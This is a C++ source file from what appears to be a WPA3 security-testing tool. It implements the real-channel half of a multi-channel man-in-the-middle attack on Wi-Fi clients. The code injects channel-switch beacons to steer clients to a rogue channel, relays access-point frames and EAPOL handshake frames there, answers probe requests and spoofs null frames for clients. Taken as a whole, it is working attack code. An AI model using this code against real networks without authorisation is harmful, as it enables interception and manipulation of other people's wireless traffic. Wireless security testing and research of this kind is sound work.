#include "attacks/mc_mitm/mc_mitm.h"

#include <chrono>
#include <cstring>
#include <utility>
#include <tins/tins.h>

#include "attacks/by_target/scan_AP.h"
#include "attacks/DoS_hard/dos_helpers.h"
#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester{
using namespace std;
using namespace chrono;
using namespace Tins;

void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
                                 const HWAddress<6> &addr1) {
    // Beacon — update timestamp
    if(const auto *b = dot11.find_pdu<Dot11Beacon>()){
        const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
        if(ch_ie && ch_ie->data_size() != 0 && ch_ie->data_ptr()[0] == netconfig.real_channel)
            last_real_beacon = steady_clock::now();
    }

    const bool might_forward = clients.contains(addr1.to_string()) &&
            clients.at(addr1.to_string())->should_forward(*pdu);

    // Print
    if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>())
        print_rx(LogLevel::INFO, "Real channel", dot11, might_forward ? " -- MitM'ing" : "");
    else if(dot11.addr1() == client_mac)
        display_client_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
    else if(might_forward)
        print_rx(LogLevel::INFO, "Real channel", dot11, " -- MitM");

    // Forward na rogue channel
    if(might_forward){
        const auto &client = clients.at(addr1.to_string());
        client->modify_packet(*pdu);
        sock_rogue->send(*pdu, netconfig.rogue_channel);
    }

    if(dot11.find_pdu<Dot11Deauthentication>()) del_client(dot11.addr1());
}

bool McMitm::is_eapol(const PDU &pdu){
    const auto snap = pdu.find_pdu<SNAP>();
    if (snap && snap->eth_type() == 0x888e) return true;
    return pdu.find_pdu<EAPOL>() != nullptr;
}

bool McMitm::handle_probe_request_real(const HWAddress<6> addr2, const Dot11 &dot11) const{
    if(dot11.find_pdu<Dot11ProbeRequest>()){
        probe_resp->addr1(dot11.find_pdu<Dot11ProbeRequest>()->addr2());
        RadioTap rt;
        rt.inner_pdu(probe_resp->clone());
        sock_real->send(rt, netconfig.real_channel);
        display_client_traffic(dot11, "Real channel", " -- Replied");
        return true;
    }
    if(dot11.find_pdu<Dot11ProbeResponse>()){
        if(addr2 != ap_mac) print_rx(LogLevel::INFO, "Real channel", dot11);
        //return true;
    }
    return false;
}

void McMitm::handle_auth_from_client_real(const Dot11Authentication &auth) {
    const auto client_addr = auth.addr2();
    print_rx(LogLevel::INFO, "Real channel", auth);

    if(client_addr == client_mac)
        log(LogLevel::WARNING, "Client {} is connecting on real channel, injecting CSA beacon to try to correct.",
            client_addr.to_string());

    if(clients.contains(client_addr.to_string())) del_client(client_addr);
    send_csa_beacon(1, client_addr);
    send_csa_beacon();

    ClientState client(client_addr.to_string());
    client.update_state(ClientState::Connecting);
    add_client(std::move(client));
}

void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu){
    Dot11 *dot11 = pdu->find_pdu<Dot11>();
    if(!dot11) return;

    const HWAddress<6> addr1 = dot11->addr1();
    HWAddress<6> addr2;
    if(const auto *mgmt = pdu->find_pdu<Dot11ManagementFrame>())
        addr2 = mgmt->addr2();
    else if(const auto *data = pdu->find_pdu<Dot11Data>())
        addr2 = data->addr2();
    else{
        log(LogLevel::WARNING, "Unknown frame type");
        return;
    }

    if (handle_probe_request_real(addr2, *dot11)) return;

    if(dot11->addr1() == ap_mac){ // STA -> AP
        if(const auto *auth = dot11->find_pdu<Dot11Authentication>())
            handle_auth_from_client_real(*auth);
        else if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()){
            print_rx(LogLevel::INFO, "Real channel", *dot11);
            del_client(addr2.to_string());
        } else if(clients.contains(addr2.to_string())){
            display_client_traffic(*dot11, "Real channel");
        } else if(addr2 == client_mac){
            display_client_traffic(*dot11, "Real channel");
        }

        // Sleep mode detection
        if(power_mgmt(*dot11) && clients.contains(addr2.to_string())){
            const auto &client = clients.at(addr2.to_string());
            if(client->state < ClientState::Attack_Done){
                log(LogLevel::WARNING, "Client {} is going to sleep on real channel.", addr2.to_string());
                Dot11Data null_frame{};
                null_frame.type(Dot11::DATA);
                null_frame.subtype(4);
                null_frame.addr1(ap_mac);
                null_frame.addr2(addr2);
                null_frame.addr3(ap_mac);
                sock_real->send(null_frame, netconfig.real_channel);
            }
        }
    } else if(addr2 == ap_mac){ // AP -> STA
        handle_from_ap_real(pdu, *dot11, addr1);

        // EAPOL od AP → forward na rogue channel
        if(is_eapol(*pdu) /*&& clients.contains(addr1.to_string())*/){
            log(LogLevel::INFO, "Real channel: EAPOL from AP -> forwarding to rogue channel");
            sock_rogue->send(*pdu, netconfig.rogue_channel);
        }
    } else if(dot11->addr1() == client_mac || addr2 == client_mac){
        display_client_traffic(*dot11, "Real channel");
    }
}
}